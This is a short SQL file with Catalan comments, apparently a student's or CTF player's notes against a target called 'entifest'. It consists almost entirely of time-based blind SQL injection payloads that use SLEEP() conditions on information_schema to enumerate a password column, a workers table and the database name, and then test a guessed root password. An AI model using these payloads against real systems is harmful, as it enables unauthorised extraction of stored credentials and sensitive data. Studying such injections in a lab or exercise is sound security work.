-- entifest --
-- // interessants: SLEEP(1), LIKE, SUBSTRING(), POSITIION(), EXISTS(), IF(), LENGTH()
-- Estratègia:
-- -> trobar la taula on es guarden les contrasenyes
-- -> trobar la base de dades on es guarda la informació sensible
-- -> consultar la informació sensible

-- #1 Buscar directament la columna que guarda la 'contrasenya'
IF(EXISTS(SELECT * FROM information_schema.columns WHERE column_name LIKE 'contrasenya'), SLEEP(1), SLEEP(0)); -- -

-- #2 Buscar directament el nom de la taula que guarda la 'contrasenya'
IF(EXISTS(SELECT * FROM information_schema.columns WHERE column_name LIKE 'contrasenya' AND table_name LIKE '%o%'), SLEEP(1), SLEEP(0)); -- -

IF(EXISTS(SELECT * FROM information_schema.columns WHERE column_name LIKE 'contrasenya' AND table_name LIKE '%e%o%' AND LENGTH(table_name) < 100), SLEEP(1), SLEEP(0)); -- -

IF(EXISTS(SELECT * FROM information_schema.columns WHERE column_name LIKE 'contrasenya' AND table_name LIKE 'treballadors' AND LENGTH(table_name) < 100), SLEEP(1), SLEEP(0)); -- -

-- #3 Trobar el nom de la base de dades
IF(database() LIKE 'esdeveniments', SLEEP(1), SLEEP(0)); -- -

-- #4 Buscar si hi ha algun usuari 'root' o 'admin'
IF(EXISTS(SELECT * FROM esdeveniments.treballadors WHERE nom LIKE '%root%' AND contrasenya LIKE 'xx.okay.xx'), SLEEP(1), SLEEP(0)); -- -
